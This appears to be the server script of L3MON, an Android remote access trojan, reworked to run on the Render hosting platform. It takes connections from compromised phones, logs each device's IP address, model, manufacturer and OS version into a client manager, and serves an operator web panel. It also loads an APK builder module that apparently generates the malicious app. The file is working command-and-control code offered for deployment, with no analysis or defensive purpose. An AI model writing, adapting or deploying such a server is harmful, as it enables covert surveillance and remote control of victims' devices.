
/*
*   DroiDrop / L3MON
*   Render-ready server version
*   PM2 removed, dynamic ports for Render
*/

const express = require('express');
const app = express();
const http = require('http');
const { Server } = require('socket.io');
// const geoip = require('geoip-lite'); // Optional if you want geolocation
const CONST = require('./includes/const');
const db = require('./includes/databaseGateway');
const logManager = require('./includes/logManager');
const ClientManager = require('./includes/clientManager');
const apkBuilder = require('./includes/apkBuilder');

const clientManager = new ClientManager(db);

// Make globals accessible (as in original code)
global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// -----------------------------
// Use dynamic ports for Render
// -----------------------------
CONST.control_port = process.env.PORT || CONST.control_port; // Socket/Server port
CONST.web_port = CONST.control_port; // Web admin interface uses same port

// -----------------------------
// HTTP server and Socket.IO
// -----------------------------
const server = http.createServer(app);
const client_io = new Server(server);

client_io.sockets.pingInterval = 30000;

client_io.on('connection', (socket) => {
    socket.emit('welcome');
    const clientParams = socket.handshake.query;

    // Use x-forwarded-for for real IP behind Render proxy
    const clientIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const clientGeo = {}; // geoip.lookup(clientIP) || {};

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        const onevent = socket.onevent;
        socket.onevent = function (packet) {
            const args = packet.data || [];
            onevent.call(this, packet);        // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);        // catch-all
        };

        socket.on("*", (event, data) => {
            console.log(event, data);
        });
    }
});

// -----------------------------
// Admin web interface
// -----------------------------
app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

// -----------------------------
// Start the server
// -----------------------------
server.listen(CONST.control_port, () => {
    console.log(`Server running on Render at port ${CONST.control_port}`);
});
